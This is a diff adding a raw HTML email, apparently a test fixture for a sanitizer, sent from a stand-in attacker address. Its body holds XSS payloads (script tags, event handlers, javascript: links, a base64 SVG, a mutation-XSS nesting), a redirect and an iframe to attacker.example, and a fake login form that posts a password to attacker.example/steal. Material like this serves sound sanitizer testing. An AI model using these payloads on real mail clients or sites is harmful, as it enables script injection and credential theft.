@@ -1,0 +1,22 @@
+From: Evil <evil@attacker.example>
+To: aaaaaaaaaaaaaaaaaaaaaaaaaa@nl.example.org
+Subject: Totally normal newsletter
+Date: Wed, 11 Nov 2026 08:00:00 +0000
+Message-ID: <xss-1@attacker.example>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head><base href="https://attacker.example/"><meta http-equiv="refresh" content="0;url=https://attacker.example"></head>
+<body onload="alert(1)">
+<script>alert('xss')</script>
+<style>body{display:none}</style>
+<p style="position:fixed;top:0;left:0;width:9999px;color:#fff;background:#000">Overlay</p>
+<svg onload="alert(2)"><script>alert(3)</script><a xlink:href="javascript:alert(4)"><text>x</text></a></svg>
+<img src="x" onerror="alert(5)">
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDYpIi8+">
+<a href="javascript:alert(7)">click</a>
+<iframe src="https://attacker.example/frame"></iframe>
+<form action="https://attacker.example/steal"><input name="pw"><button>Login</button></form>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(8)></style></mglyph></table></mtext></math>
+<p>Safe text stays.</p>
+</body></html>
